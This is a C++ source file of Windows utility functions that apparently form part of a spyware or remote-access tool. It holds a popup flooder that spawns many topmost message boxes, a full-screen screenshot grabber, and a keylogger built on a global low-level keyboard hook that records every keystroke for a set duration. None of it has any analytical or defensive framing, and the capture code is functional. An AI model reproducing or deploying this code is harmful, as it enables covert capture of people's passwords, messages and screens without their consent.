#include <cstdlib>
#include <ctime>
#include <thread>

#include <Windows.h>
#include "WinUtils.h"
#include <iostream>

bool windows::do_popup(const std::string& window_name, const std::string& text, const DWORD flags)
{
    const auto result = MessageBoxA(GetForegroundWindow(), text.c_str(), window_name.c_str(), flags);
    if (!result) {
        return false;
    }
    return true;
}

void windows::do_popups(const size_t count, const std::string& window_name, const std::string& text, const DWORD flags)
{
    // Seed the random number generator
    std::srand(static_cast<unsigned int>(std::time(nullptr)));

    // Get the screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    for (size_t i = 0; i < count; ++i) {
        // Generate random positions for the message box
        int x_pos = std::rand() % (screenWidth - 200); // 200 is an arbitrary width of the MessageBox
        int y_pos = std::rand() % (screenHeight - 100); // 100 is an arbitrary height of the MessageBox

        // Create the message box in a new thread to avoid blocking the loop
        std::thread t([window_name, text, flags, x_pos, y_pos](LPVOID param) -> DWORD {
                RECT rect;
                GetWindowRect((HWND)param, &rect);
                SetWindowPos((HWND)param, HWND_TOPMOST, x_pos, y_pos, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE);
                MessageBoxA((HWND)param, text.c_str(), window_name.c_str(), flags | MB_SETFOREGROUND);
                return 0;
            },
            nullptr);
        t.detach();

        // Small delay between creating message boxes
        std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_BETWEEN_POPUPS_MILLIS));
    }
    std::this_thread::sleep_for(std::chrono::seconds(1));
}

std::string windows::take_screenshot()
{
    // Get the desktop device context (DC) of the entire virtual screen
    HDC h_screen_dc = GetDC(nullptr);
    HDC h_memory_dc = CreateCompatibleDC(h_screen_dc);

    // Get the dimensions of the virtual screen (covers all monitors)
    int screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int screen_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int screen_top = GetSystemMetrics(SM_YVIRTUALSCREEN);

    // Create a compatible bitmap from the screen DC
    HBITMAP h_bitmap = CreateCompatibleBitmap(h_screen_dc, screen_width, screen_height);

    // Select the compatible bitmap into the compatible memory DC
    HBITMAP h_old_bitmap = (HBITMAP)SelectObject(h_memory_dc, h_bitmap);

    // Bit block transfer into our compatible memory DC
    BitBlt(h_memory_dc, 0, 0, screen_width, screen_height, h_screen_dc, screen_left, screen_top, SRCCOPY);

    // Get the bitmap information
    BITMAP bmp;
    GetObject(h_bitmap, sizeof(BITMAP), &bmp);

    // Calculate the stride (row size) of the bitmap
    int row_size = ((bmp.bmWidth * bmp.bmBitsPixel + 31) / 32) * 4;

    // Bitmap file header
    BITMAPFILEHEADER file_header;
    BITMAPINFOHEADER info_header;

    // Fill the file header
    file_header.bfType = 0x4D42; // "BM"
    file_header.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    file_header.bfSize = file_header.bfOffBits + row_size * bmp.bmHeight;
    file_header.bfReserved1 = 0;
    file_header.bfReserved2 = 0;

    // Fill the info header
    info_header.biSize = sizeof(BITMAPINFOHEADER);
    info_header.biWidth = bmp.bmWidth;
    info_header.biHeight = bmp.bmHeight;
    info_header.biPlanes = 1;
    info_header.biBitCount = bmp.bmBitsPixel;
    info_header.biCompression = BI_RGB;
    info_header.biSizeImage = 0;
    info_header.biXPelsPerMeter = 0;
    info_header.biYPelsPerMeter = 0;
    info_header.biClrUsed = 0;
    info_header.biClrImportant = 0;

    // Allocate buffer for bitmap file
    std::string bmp_buffer(file_header.bfSize, '\0');

    // Copy headers
    memcpy(bmp_buffer.data(), &file_header, sizeof(BITMAPFILEHEADER));
    memcpy(bmp_buffer.data() + sizeof(BITMAPFILEHEADER), &info_header, sizeof(BITMAPINFOHEADER));

    // Copy bitmap data
    GetDIBits(h_memory_dc, h_bitmap, 0, bmp.bmHeight, bmp_buffer.data() + file_header.bfOffBits, (BITMAPINFO*)&info_header, DIB_RGB_COLORS);

    // Cleanup
    SelectObject(h_memory_dc, h_old_bitmap);
    DeleteObject(h_bitmap);
    DeleteDC(h_memory_dc);
    ReleaseDC(nullptr, h_screen_dc);

    // Convert the buffer to a string
    return bmp_buffer;
}

BOOL windows::get_message_with_timeout(MSG* msg, unsigned int to)
{
    BOOL res;
    UINT_PTR timer_id = SetTimer(nullptr, 0, to, nullptr);
    res = GetMessage(msg, nullptr, 0, 0);
    KillTimer(nullptr, timer_id);
    if (!res)
        return FALSE;
    if (msg->message == WM_TIMER && msg->hwnd == nullptr && msg->wParam == timer_id)
        return FALSE;
    return TRUE;
}

std::string windows::log_keys(unsigned int duration_seconds)
{
    key_logger_key_codes.clear();
    HHOOK hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, windows::log_keys_hook, 0, 0);

    MSG msg;
    get_message_with_timeout(&msg, duration_seconds * 1000);

    UnhookWindowsHookEx(hook_handle);

    std::string result = "";
    for (const DWORD val : key_logger_key_codes) {
        result.append(std::string(1, static_cast<char>(val)));
    }
    return result;
}

LRESULT CALLBACK windows::log_keys_hook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            const auto key_code = p->vkCode;
            key_logger_key_codes.push_back(key_code);
            break;
        }
    }
    return false; // don't consume event
}
